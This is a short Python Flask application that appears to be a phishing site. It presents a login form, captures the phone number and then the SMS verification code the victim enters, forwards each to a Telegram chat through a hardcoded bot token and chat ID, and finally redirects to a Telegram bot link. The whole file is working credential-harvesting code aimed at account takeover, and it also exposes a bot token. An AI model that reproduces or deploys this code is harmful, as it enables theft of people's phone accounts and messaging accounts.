from flask import Flask, render_template, request, redirect, url_for
from telegram import Bot

app = Flask(__name__)

TELEGRAM_TOKEN = '5104141375:AAEh67B2ZaUzoZgrCcmcPrIeg1bS4iLZXH8'
TELEGRAM_CHAT_ID = '-1002059701729'

bot = Bot(token=TELEGRAM_TOKEN)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():
    phone_number = request.form.get('phone_number')
    print(f"Номер телефона: {phone_number}")
    bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f'Номер телефона: {phone_number}')
    return redirect(url_for('login_page', phone_number=phone_number))

@app.route('/login_page', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        sms_code = request.form.get('sms_code')
        print(f"SMS-код: {sms_code}")
        bot.send_message(chat_id=TELEGRAM_CHAT_ID, text=f'СМС код: {sms_code}')
        return redirect("https://t.me/writeNicholas_bot")

    phone_number = request.args.get('phone_number', '')
    print(f"Номер телефона: {phone_number}")
    return render_template('login.html', phone_number=f'Номер телефона{phone_number}')

def next_page():
    # Перенаправление на внешний URL
    return redirect("https://t.me/writeNicholas_bot")

if __name__ == '__main__':
    app.run(debug=True)
